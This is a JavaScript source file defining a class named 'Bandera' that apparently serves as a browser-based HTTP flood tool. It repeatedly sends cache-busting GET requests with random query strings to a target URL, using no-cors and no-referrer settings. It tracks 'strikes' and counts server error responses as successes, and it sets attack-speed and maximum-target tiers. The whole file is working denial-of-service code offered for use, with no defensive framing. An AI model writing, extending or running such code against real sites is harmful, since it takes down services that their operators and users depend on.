class Bandera {

    static _attackSpeed = [1, 5, 10, 20, 50, 100];
    static _maxTargets = [5, 10, 20, 30, 50, 75, 100];

    pinned = false;
    target = null;
    requests = {
        total: 0,
        success: 0,
        failed: 0,
        strike: 0
    };

    constructor(target) {
        this.target = target;
        return this;
    }

    async run() {
        return fetch(this.target.url + this.getRandomParam(), {
            method: 'GET',
            mode: 'no-cors',
            cache: 'no-cache',
            referrerPolicy: "no-referrer",
            expires: 0
        }).catch(
            (error) => {
                if (error.code === 20) {
                    return;
                }
                this.requests.failed++;
                this.requests.strike++;
            }
        ).then(
            (response) => {
                if (response && !response.ok) {
                    this.requests.success++;
                    this.requests.strike = 0;
                }
                this.requests.total++;
            }
        );
    }

    getRandomParam() {
        return '/?' + this.getRandomString() + '=' + this.getRandomString();
    }

    getRandomString(minLen = 3, maxLen = 25) {
        const chars = 'abcdefghijklmnopqrstuvwxyz';
        const len = Math.floor(Math.random() * (maxLen - minLen + 1)) + minLen;

        let str = '';
        for (let i = 0; i < len; i++) {
            str += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return str;
    }
}

export { Bandera as default }
